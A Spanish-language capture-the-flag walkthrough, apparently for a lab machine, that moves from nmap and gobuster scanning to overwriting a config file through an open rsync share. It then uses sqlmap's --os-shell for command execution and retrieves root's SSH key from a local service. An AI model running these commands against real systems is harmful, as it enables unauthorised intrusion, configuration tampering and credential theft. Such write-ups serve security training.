### Tags: `rsync` `sqlmap` `getcap`

# Escaneo (*22, 80, 139, 445*)

```css
sudo nmap -p- --open -sSCV --min-rate 4000 -vvv -n -Pn <IP> -oN escaneo
````

![image](https://github.com/user-attachments/assets/b5443b93-8748-44d6-9843-71d2a06dde6c)


# Port80 / Gobuster

Como vimos arriba en el reporte del escaneo la web es un *ubuntu Default Page* por ende tiramos de Gobuster

```ruby
gobuster dir -u http://<IP>/ -t 100 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,php,html --no-error
```

Encontramos este directorio:

![image](https://github.com/user-attachments/assets/7e47c4c7-3b94-4b8d-95b9-3e2c77e181cd)

Si vamos en la web nos dice **403 Forbidden** y cuando hacemos `Ctrl + u` nos dice esto otro:

![image](https://github.com/user-attachments/assets/0aba8e1a-53d9-4dff-9216-6ee95cd55637)

Esto significa que actualmente estamos en el **entorno de producción** y tenemos que encontrar una manera de ir al entorno de producción. Para ello podemos consultar otros servicios. Entonces tenemos ``Rsync y 'Rsync`` se usa para **transferir** y **sincronizar** archivos entre una computadora y un disco duro externo y entre computadoras en red comparando los tiempos de modificación y los tamaños de los archivos. 
Lo que vamos a hacer ahora es verificar loa archivos del directorio `conf` y se hace de esta manera:

```ruby
 rsync -av rsync://<IP>/
```

![image](https://github.com/user-attachments/assets/3b03ee10-1fbf-4ee4-822f-ae331a0319bd)

Ahora nos metemos dentro de `Conf`

```ruby
rsync -av rsync://<IP>/Conf
```

![image](https://github.com/user-attachments/assets/143f82fd-de88-4b48-8b9e-cf4534e8d426)

Ahora lo que hacemos es **copiarnos** todos los archivos a nuestra máquina y verifiquemos si podemos obtener algo

```ruby
rsync -av rsync://<IP>/Conf ./mi_Conf
```

![image](https://github.com/user-attachments/assets/69154a29-52ff-41c4-9c94-a1af5c2d86dc)

Observando los distintos archivos, en `webapp.ini` encontramos credenciales de un **TomCat** que esta en `prod`

![image](https://github.com/user-attachments/assets/6cea61e9-e1e3-4ea2-acf2-a058c6b6e8d1)

Entonces lo que hacemos es cambiarlo a `dev` y enviarlo otra ves con el archivo cambiado 

```ruby
nano webapp.ini   #cambiar a dev
rsync -av webapp.ini rsync://<IP>/Conf/webapp.ini
```

![image](https://github.com/user-attachments/assets/073bb231-b8ba-46e9-911b-e5f0176fd0f5)

Ahora si recargamos la pagina en `/admin` podemos visualizar la web y no nos da el 403 de antes

![image](https://github.com/user-attachments/assets/a40d9cf5-1edc-48e5-9075-007c15add7d8)

# SQLMap

Capturamos la petición con Burp y lo guardamos para jugar con `sqlmap`
- `-dbs` enumere todas las bases de datos disponibles
- `--risk 3` nivel de riesgo (técnicas más agresivas y potencialmente más ruidosas)
- `--level 5` nivel de profundidad de las técnicas de explotación
- `--os-shell` Le indica a SQLmap que intente obtener un shell de sistema operativo en el servidor remoto

```ruby
sudo sqlmap -r SQL_burp -dbs --risk 3 --level 5 --os-shell 
```

Una ves nos dio la `os-shell` no entablamos una ReverShell de esta forma

![image](https://github.com/user-attachments/assets/8b500aaa-a9af-4bbd-afab-6b09be1bf00c)

![image](https://github.com/user-attachments/assets/d307da36-fa03-473f-bbb4-2f8cabe9bbcd)


# Escalada **ROOT**

Tenemos la primera flag

![image](https://github.com/user-attachments/assets/63efa394-6cdc-4d36-8188-f87a3b2b0f7f)

Haciendo un `getcap -r / 2>/dev/null` tenemos capibility (**cap_net_raw+ep**) indica que el archivo tiene el bit de ejecución elevado (**ep**) y la capibility **cap_net_raw** asignada.

![image](https://github.com/user-attachments/assets/8acaf11c-26f0-49a6-b899-ea459a9bee17)

Lo que hacemos es tirar un `LinPeas` y observamos esto:

![image](https://github.com/user-attachments/assets/23a8f327-409a-4951-9962-67426f514288)

Entonces si hacemos un `curl http://127.0.0.1:1027/?admin=ScadfwerDSAd_343123ds123dqwe12` obtenemos la id_rsa de `root`

![image](https://github.com/user-attachments/assets/f5f4b619-70d7-4bd2-a156-1dc27cc2f773)

Nos conectamos por **ssh** y listo

![image](https://github.com/user-attachments/assets/7631cb16-dbc0-4752-b81e-c7181acf2707)





